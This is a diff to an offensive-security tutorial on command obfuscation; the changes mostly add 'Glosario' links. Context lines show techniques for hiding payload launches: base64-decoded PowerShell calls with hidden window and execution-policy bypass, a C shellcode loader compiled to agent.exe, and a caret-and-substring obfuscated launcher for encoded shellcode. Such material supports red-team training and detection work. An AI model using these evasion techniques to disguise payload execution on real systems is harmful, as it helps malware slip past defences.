@@ -134,7 +134,7 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
        for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#"
         cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode <-- here is our base64 syscall decoded
 
-[Final Notes:](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes)<br />
+[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
 
@@ -184,7 +184,6 @@ The above string can be obfuscated using **bash special characters: '** or **\\*
 
 ![bash rev obfuscation](http://i.cubeupload.com/Q7qgFW.png)
 `HINT: Single quotes are not allowed in Combining rev <<< and the batch (\) escape character`
-
 
 ---
 
@@ -259,6 +258,8 @@ The above string can be obfuscated using **bash special characters: '** or **\\*
       $string   <-- execute/decode the base64 string (syscall) at runtime
 
 ![bash obfuscation](http://i.cubeupload.com/gXKy3s.png)
+
+[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
 
@@ -353,6 +354,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 ![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)
 
+[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
+
 ---
 
 <br /><br /><br /><br />
@@ -442,6 +445,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
       gcc.exe template.c -o agent.exe
 
+[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
+
 ---
 
 
@@ -503,6 +508,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 	exec_mycode(buffer);
       }
 
+[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
+
 ---
 
 <br /><br /><br /><br />
@@ -530,7 +537,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
       OBFUSCATED    : @c^Md%i:~63,1%e^xE %i:~62,1%c pO^w%U7%he^L^l%i:~63,1%e^xE %H%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
 
-[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#Glosario)<br />
+[Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
 
